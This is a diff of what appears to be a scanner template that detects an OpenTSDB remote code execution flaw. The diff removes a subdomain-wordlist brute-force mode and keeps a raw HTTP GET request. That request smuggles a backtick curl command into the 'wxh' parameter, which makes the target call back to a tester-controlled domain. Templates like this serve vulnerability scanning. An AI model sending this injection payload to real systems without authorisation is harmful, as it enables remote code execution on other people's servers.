@@ -8,14 +8,11 @@ info:
   - https://packetstormsecurity.com/files/136753/OpenTSDB-Remote-Code-Execution.html
   severity: critical
 requests:
-- attack: sniper
-  payloads:
-    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-  raw:
-  - 'GET /q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20{{Host}}.{{Port}}.{{Subdomains}}.OpenTSDB.{{MY-DOMAIN}}%60&style=linespoint&png
+- raw:
+  - 'GET /q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20{{Host}}.{{Port}}.{{Hostname}}.OpenTSDB.{{MY-DOMAIN}}%60&style=linespoint&png
     HTTP/1.1
 
-    Host: {{Subdomains}}
+    Host: {{Hostname}}
 
     User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
 
@@ -24,4 +21,3 @@ requests:
     Accept: */*
 
     Connection: keep-alive'
-  threads: 100
